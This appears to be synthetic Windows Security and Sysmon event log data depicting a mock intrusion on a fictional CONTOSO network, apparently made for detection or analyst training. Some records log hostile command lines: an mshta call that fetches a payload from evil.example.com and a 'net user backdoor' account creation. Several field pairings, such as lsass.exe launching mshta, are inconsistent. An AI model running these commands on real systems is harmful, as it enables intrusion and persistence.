  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:35:12.0000000Z" /><EventRecordID>868</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">32969</Data><Data Name="WorkstationName">SRV-SQL01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>12</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:35:34.0000000Z" /><EventRecordID>869</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>DC02</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:35:34.0000000Z</Data><Data Name="EventType">DeleteKey</Data><Data Name="ProcessId">32189</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="TargetObject">HKLM\Software\Policies\Microsoft\Windows Defender\DisableAntiSpyware</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:00.0000000Z" /><EventRecordID>870</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">.</Data><Data Name="ObjectName">C:\Windows\Temp\stager.exe</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\net.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>1</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:02.0000000Z" /><EventRecordID>871</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:36:02.0000000Z</Data><Data Name="ProcessGuid">{03579-15561-3E29-68B3}</Data><Data Name="ProcessId">55849</Data><Data Name="Image">C:\Windows\System32\lsass.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="User">.\svc_sql</Data><Data Name="ParentProcessId">5815</Data><Data Name="ParentImage">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="ParentCommandLine">powershell.exe Get-Process | Export-Csv C:\temp\procs.csv</Data><Data Name="Hashes">MD5=61e8e20648c1e3c3280c2fe4e6060aa0,SHA256=69965c57c8416d61d7eeeb18b11e9b6d174b5b585024f0fde8577c5bea377469</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:21.0000000Z" /><EventRecordID>872</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">svc_backup</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xf90f</Data><Data Name="NewProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xc02</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:22.0000000Z" /><EventRecordID>873</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-9821-6343-1612-1001</Data><Data Name="TargetUserName">bob</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">44131</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">WKSTN-CHARLIE</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:24.0000000Z" /><EventRecordID>874</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="ObjectName">C:\Windows\System32\drivers\rootkit.sys</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\lsass.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:43.0000000Z" /><EventRecordID>875</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-2601-9001-2639-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">198.51.100.23</Data><Data Name="IpPort">45268</Data><Data Name="ProcessName">C:\Windows\System32\mshta.exe</Data><Data Name="WorkstationName">SRV-FILE01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:53.0000000Z" /><EventRecordID>876</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-SQL01</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">.</Data><Data Name="NewProcessId">0x7f9d</Data><Data Name="NewProcessName">C:\Windows\System32\reg.exe</Data><Data Name="CommandLine">mshta.exe http://evil.example.com/payload.hta</Data><Data Name="ParentProcessName">C:\Windows\System32\lsass.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x43a</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:36:58.0000000Z" /><EventRecordID>877</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="Workstation">DC01</Data><Data Name="Status">0x0</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:37:21.0000000Z" /><EventRecordID>878</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0xa784</Data><Data Name="NewProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="CommandLine">net user backdoor P@ssw0rd123 /add</Data><Data Name="ParentProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0x663</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:37:26.0000000Z" /><EventRecordID>879</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0x7d56cf</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:37:41.0000000Z" /><EventRecordID>880</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-FILE01</Computer></System><EventData><Data Name="SubjectUserName">bob</Data><Data Name="SubjectDomainName">.</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="TargetServerName">SRV-WEB01</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:37:45.0000000Z" /><EventRecordID>881</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserName">t.miller</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="SubjectLogonId">0xf18270</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:38:07.0000000Z" /><EventRecordID>882</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>JUMPHOST01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-8656-5389-9728-1001</Data><Data Name="TargetUserName">charlie</Data><Data Name="TargetDomainName">NT AUTHORITY</Data><Data Name="LogonType">10</Data><Data Name="IpAddress">192.168.1.200</Data><Data Name="IpPort">56911</Data><Data Name="ProcessName">C:\Users\alice\Downloads\setup.exe</Data><Data Name="WorkstationName">JUMPHOST01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:38:31.0000000Z" /><EventRecordID>883</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserName">jane.smith</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="ObjectName">C:\Users\Public\Documents\exfil.zip</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\System32\wscript.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:38:35.0000000Z" /><EventRecordID>884</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-CHARLIE</Computer></System><EventData><Data Name="SubjectUserName">charlie</Data><Data Name="SubjectDomainName">NT AUTHORITY</Data><Data Name="SubjectLogonId">0x619341</Data><Data Name="PrivilegeList">SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:38:56.0000000Z" /><EventRecordID>885</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-3631-5201-4868-1001</Data><Data Name="TargetUserName">SYSTEM</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">16653</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4625</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:39:04.0000000Z" /><EventRecordID>886</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>WKSTN-BOB</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">alice</Data><Data Name="TargetDomainName">CONTOSO</Data><Data Name="LogonType">3</Data><Data Name="FailureReason">%%2313</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc0000064</Data><Data Name="IpAddress">203.0.113.45</Data><Data Name="IpPort">32834</Data><Data Name="WorkstationName">WKSTN-BOB</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4663</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:39:17.0000000Z" /><EventRecordID>887</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>SRV-WEB01</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CONTOSO</Data><Data Name="ObjectName">C:\Windows\Temp\stager.exe</Data><Data Name="ObjectType">File</Data><Data Name="AccessList">%%4417
			%%4418</Data><Data Name="ProcessName">C:\Windows\SysWOW64\rundll32.exe</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:39:38.0000000Z" /><EventRecordID>888</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC01</Computer></System><EventData><Data Name="SubjectUserSid">S-1-0-0</Data><Data Name="SubjectUserName">-</Data><Data Name="SubjectDomainName">-</Data><Data Name="SubjectLogonId">0x0</Data><Data Name="TargetUserSid">S-1-5-21-1691-8960-1326-1001</Data><Data Name="TargetUserName">svc_sql</Data><Data Name="TargetDomainName">.</Data><Data Name="LogonType">2</Data><Data Name="IpAddress">10.0.2.99</Data><Data Name="IpPort">57357</Data><Data Name="ProcessName">C:\Windows\System32\powershell.exe</Data><Data Name="WorkstationName">DC01</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:40:00.0000000Z" /><EventRecordID>889</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>LAPTOP-MGMT</Computer></System><EventData><Data Name="SubjectUserName">SYSTEM</Data><Data Name="SubjectDomainName">CORP</Data><Data Name="NewProcessId">0x759a</Data><Data Name="NewProcessName">C:\Windows\SysWOW64\rundll32.exe</Data><Data Name="CommandLine">cmd.exe /c whoami &amp;&amp; net user</Data><Data Name="ParentProcessName">C:\Windows\System32\svchost.exe</Data><Data Name="TokenElevationType">%%1936</Data><Data Name="ProcessId">0xe6f</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" /><EventID>11</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:40:19.0000000Z" /><EventRecordID>890</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WKSTN-ALICE</Computer></System><EventData><Data Name="UtcTime">2024-11-25T12:40:19.0000000Z</Data><Data Name="ProcessId">49134</Data><Data Name="Image">C:\Windows\System32\powershell.exe</Data><Data Name="TargetFilename">C:\Windows\Temp\stager.exe</Data><Data Name="CreationUtcTime">2024-11-25T12:40:19.0000000Z</Data></EventData></Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" /><EventID>4776</EventID><Version>0</Version><Level>0</Level><Task>0</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="2024-11-25T12:40:34.0000000Z" /><EventRecordID>891</EventRecordID><Execution ProcessID="556" ThreadID="1200" /><Channel>Security</Channel><Computer>DC02</Computer></System><EventData><Data Name="PackageName">MICROSOFT_AUTHENTICATION_PACKAGE_V1_0</Data><Data Name="TargetUserName">jane.smith</Data><Data Name="Workstation">DC02</Data><Data Name="Status">0xC0000064</Data></EventData></Event>
  